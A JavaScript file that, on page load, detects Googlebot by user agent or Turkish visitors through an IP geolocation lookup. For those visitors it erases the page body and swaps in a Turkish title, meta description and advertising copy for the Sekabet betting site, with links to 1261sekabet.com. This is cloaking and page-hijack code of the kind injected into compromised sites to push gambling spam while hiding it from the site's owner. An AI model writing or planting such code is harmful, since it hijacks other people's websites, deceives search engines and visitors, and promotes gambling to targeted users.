// Function to detect if the visitor is Googlebot
function isGooglebot() {
  return /Googlebot/.test(navigator.userAgent);
}

// Function to change the title and meta description
function updateTitleAndDescription() {
  // Update document title
  document.title = 'Sekabet, Sekabet Giriş, Sekabet Canlı Casino ve Bahisleri';

  // Update meta description
  let metaDescription = document.querySelector('meta[name="description"]');
  if (!metaDescription) {
    metaDescription = document.createElement('meta');
    metaDescription.name = 'description';
    document.head.appendChild(metaDescription);
  }
  metaDescription.content = 'Sekabet, güncel giriş adresiyle 2024 yılında da en yüksek oranlar ve avantajlı bonus fırsatlarıyla kazançlı bahis deneyimi sunuyor. Sekabet\'e hemen katılın ve eğlence dolu dünyaya adım atın!';
}

// Function to update the body content
function updateBodyContent() {
  // ** Clear only the body content but avoid breaking the page **
  document.body.innerHTML = ''; // Clear the body but keep <head> intact

  // ** Create new container for the new content **
  document.body.innerHTML = `
    <header class="p-4 text-center" style="background-color: #117989; height: 60px; padding: 0 !important;"> 
      <img src="https://hoodiepepe.github.io/granter/logo.png" alt="Sekabet" style="width: 160px;"> 
    </header>

    <article class="article">
      <p class="article-content">
        <center> 
          <a href="https://1261sekabet.com/">
            <img src="https://hoodiepepe.github.io/granter/banner.jpg" style="width: 350px;">
          </a>
        </center> 
      </p>
    </article>

    <center>
      <a style="color: black; font-size: 16px;">SekaBet'e Giriş Yapmak İçin Lütfen Aşağıdaki Butona Tıklayınız.</a>
    </center>

    <a href="https://1261sekabet.com/" class="btn btn-login">
      SEKABET'E GİRİŞ
    </a>

    <main class="container mt-4">
      <article class="article">
        <h2 class="article-title">Sekabet: Eğlence ve Fırsatların Adresi</h2>
        <p class="article-content">
          Sekabet, oyun dünyasına yenilikçi bir soluk getiriyor! Zengin içerik seçenekleri, kullanıcı dostu arayüzü ve avantajlı promosyonlarıyla oyun severlerin vazgeçilmezi haline gelen Sekabet, eğlenceyi ve kazancı bir araya getiriyor. Haydi, siz de bu heyecana katılın ve Sekabet'un ayrıcalıklarını keşfedin!
        </p>
      </article>

      <article class="article">
        <h2 class="article-title">Sekabet'da Başarılı Olmanın Sırları</h2>
        <p class="article-content">
          Sekabet'da kazanç elde etmek için doğru stratejiler izlemek çok önemli! Bonusları etkin şekilde kullanarak başlangıç avantajı elde edin. Ayrıca, oyunlara katılmadan önce kuralları ve ipuçlarını dikkatlice inceleyerek daha bilinçli hareket edin. Sekabet'da tecrübe ve doğru planlama, başarının anahtarıdır.
        </p>
      </article>

      <article class="article">
        <h2 class="article-title">Sekabet Canlı Destek: Sorularınız İçin Hızlı Çözümler</h2>
        <p class="article-content">
          Sekabet, kullanıcı memnuniyetine verdiği önemle öne çıkıyor. Canlı destek ekibi, günün her saati sorularınıza yanıt vermek ve sorunlarınızı çözmek için hazır. Profesyonel yaklaşımı ve hızlı çözümleriyle Sekabet, oyun deneyiminizi daha keyifli hale getiriyor.
        </p>
      </article>
    </main>

    <footer>
      © 2024 Sekabet - Tüm Hakları Saklıdır.
    </footer>
  `;
}

// Function to fetch the visitor's country code
async function getCountryCode() {
  try {
    const response = await fetch('https://ipapi.co/json/');
    if (response.ok) {
      const data = await response.json();
      return data.country_code;
    }
  } catch (error) {
    console.error('Error fetching IP data:', error);
  }
  return null; // Return null if the fetch failed
}

// Main function to replace HTML content based on conditions
async function replaceContentIfNeeded() {
  // ** Instantly detect Googlebot and modify content **
  if (isGooglebot()) {
    updateTitleAndDescription();
    updateBodyContent();
    return; // Exit early since Googlebot is detected
  }

  // ** Check the user's IP for the country code (slower) **
  const countryCode = await getCountryCode();

  // ** Exit if not from Turkey **
  if (countryCode !== 'TR') return;

  // ** Change the title, meta description, and body content for users from Turkey **
  updateTitleAndDescription();
  updateBodyContent();
}

// Execute the function after the DOM is fully loaded
document.addEventListener('DOMContentLoaded', replaceContentIfNeeded);
